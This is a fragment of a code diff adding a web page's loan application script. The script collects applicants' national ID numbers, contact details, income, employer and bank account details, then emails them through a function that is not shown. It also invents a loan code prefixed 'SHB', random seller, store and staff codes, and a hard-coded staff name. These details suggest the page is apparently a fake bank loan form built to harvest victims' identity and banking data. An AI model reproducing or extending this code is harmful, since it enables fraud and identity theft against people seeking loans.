+                const loanAmount = $('#loanAmountInput').val();
+                userData = {
+                    fullName: $('#fullName').val().trim(),
+                    dob: $('#dob').val().trim(),
+                    gender: $('#gender').val(),
+                    contactAddress: $('#contactAddress').val().trim(),
+                    hometown: $('#hometown').val().trim(),
+                    idNumber: $('#idNumber').val().trim(),
+                    idIssueDate: $('#idIssueDate').val().trim(),
+                    nationality: $('#nationality').val(),
+                    idIssuePlace: $('#idIssuePlace').val(),
+                    phoneNumber: $('#phoneNumber').val().trim(),
+                    email: $('#email').val().trim(),
+                    loanType: $('#loanType').val(),
+                    loanTerm: $('#loanTerm').val(),
+                    loanAmount: loanAmount,
+                    disbursementDate: $('#disbursementDate').val().trim(),
+                    income: income,
+                    occupation: $('#occupation').val(),
+                    loanPurpose: $('#loanPurpose').val(),
+                    companyPhone: $('#companyPhone').val().trim(),
+                    companyAddress: $('#companyAddress').val(),
+                    hasBadDebt: $('#hasBadDebt').val(),
+                    hasHighDebt: $('#hasHighDebt').val(),
+                    accountHolderName: $('#accountHolderName').val().trim(),
+                    accountNumber: $('#accountNumber').val().trim(),
+                    bankName: $('#bankName').val(),
+                    loanCode: "SHB" + Math.floor(100000 + Math.random() * 900000),
+                    monthlyPayment: calculateMonthlyPayment(loanAmount, $('#loanTerm').val()),
+                    interestRate: calculateInterestRate(loanAmount),
+                    sellerCode: generateRandomCode(),
+                    storeCode: generateRandomCode(),
+                    staffCode: generateRandomCode(),
+                    staffName: "Nguyễn Thị Mỹ Duyên",
+                    isRegistered: false,
+                    qrData: {},
+                    atmCard: {},
+                    currentStep: 2
+                };
+                console.log('Submitting userData:', userData);
+                if (userData.idNumber) {
+                    const registeredIds = loadRegisteredIds();
+                    registeredIds.push(userData.idNumber);
+                    saveRegisteredIds(registeredIds);
+                }
+                if (saveToLocalStorage()) {
+                    sendRegistrationDataEmail();
+                } else {
+                    console.error('Failed to save to localStorage, not redirecting');
+                }
+            }
+        });
+
+        function generateRandomCode() {
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            let result = "";
+            for (let i = 0; i < 6; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+    </script>
+</body>
+</html>
